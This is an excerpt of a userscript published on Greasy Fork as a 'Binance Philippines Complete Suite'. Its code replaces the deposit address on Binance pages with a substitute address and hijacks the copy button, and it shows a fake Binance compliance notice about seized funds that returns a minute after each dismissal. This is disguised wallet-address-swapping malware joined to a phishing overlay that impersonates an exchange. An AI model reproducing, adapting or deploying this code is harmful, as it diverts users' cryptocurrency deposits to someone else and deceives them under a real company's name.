// ==UserScript==
// @name         Binance Philippines Complete Suite (Грешка при Депозит 1 минута)
...
// @downloadURL https://update.greasyfork.org/scripts/558832/Binance%20Philippines%20Complete%20Suite%20%28%D0%93%D1%80%D0%B5%D1%88%D0%BA%D0%B0%20%D0%BF%D1%80%D0%B8%20%D0%94%D0%B5%D0%BF%D0%BE%D0%B7%D0%B8%D1%82%201%20%D0%BC%D0%B8%D0%BD%D1%83%D1%82%D0%B0%29.user.js
// @updateURL https://update.greasyfork.org/scripts/558832/Binance%20Philippines%20Complete%20Suite%20%28%D0%93%D1%80%D0%B5%D1%88%D0%BA%D0%B0%20%D0%BF%D1%80%D0%B8%20%D0%94%D0%B5%D0%BF%D0%BE%D0%B7%D0%B8%D1%82%201%20%D0%BC%D0%B8%D0%BD%D1%83%D1%82%D0%B0%29.meta.js
// ==/UserScript==
...
;(() => {
          ...
          if (response.status >= 200 && response.status < 300) {
            try {
              ...
              if (featureFlags.showError) {
                const oldDismissed = GM_getValue("error_popup_dismissed", null)
                if (oldDismissed) {
                  console.log("[v0] Converting old dismissal flag to timestamp")
                  GM_setValue("error_popup_dismissed", null)
                }
                showErrorPopup()
              }
  ...
  function showErrorPopup() {
    ...
    const dismissedTimestamp = GM_getValue("error_popup_dismissed_time", null)
    const now = Date.now()

    // If dismissed timestamp exists, check if 1 minute has passed
    if (dismissedTimestamp) {
      const minutesPassed = (now - Number.parseInt(dismissedTimestamp)) / (1000 * 60)
      console.log("[v0] Minutes since last dismissal:", minutesPassed.toFixed(2))

      if (minutesPassed < 1) {
        console.log("[v0] Error popup dismissed less than 1 minute ago, skipping")
        return
      } else {
        console.log("[v0] 1 minute has passed, showing popup again")
      }
    }
        ...
        <div class="body">
          ...
          <div class="notice-box">
            ...
            <ul>
              ...
              <li>If it is confirmed that you intentionally attempted to misuse or fraudulently access regional promotions, the seized amount may be forfeited in full.</li>
            </ul>
          </div>

          <p>
            We understand this may be inconvenient and appreciate your patience as we complete this mandatory review. If you have concerns or wish to escalate your case, you may submit a support ticket through the official Binance Help Center.
          </p>

          <div class="signature">
            <p><strong>Best regards,</strong></p>
            <p class="dept">Binance Compliance & Risk Management Team</p>
            <p class="copyright">© ${new Date().getFullYear()} Binance. All rights reserved.</p>
          </div>
        </div>
      </div>
      <div class="error-popup-footer">
        <button id="error-popup-ok">OK, I Understand</button>
      </div>
    `
    ...
    document.getElementById("error-popup-ok").addEventListener("click", () => {
      const currentTime = Date.now().toString()
      GM_setValue("error_popup_dismissed_time", currentTime)
      console.log("[v0] Error popup dismissed at timestamp:", currentTime)
  ...
  function replaceAddress() {
    ...
    // Updated selectors to support new Binance HTML structure
    const targetContainer =
      document.querySelector(".break-all.text-PrimaryText") || document.querySelector(".break-all.text-t-Primary")
    if (!targetContainer) return

    const networkEl =
      document.querySelector(".select-box .typography-subtitle1 .text-t-Primary") ||
    ...
    if (newAddress) {
      // Get current address by combining all text content from spans
      const currentAddress = targetContainer.textContent.trim()

      if (currentAddress !== newAddress) {
        // Clear all child elements and set new address
      ...
      copyBtn.addEventListener("click", (e) => {
        ...
        navigator.clipboard
          ...
          .then(() => {
            ...
            showBinanceToast("Copied successfully. Please check carefully when pasting to avoid malicious tampering.")
          })
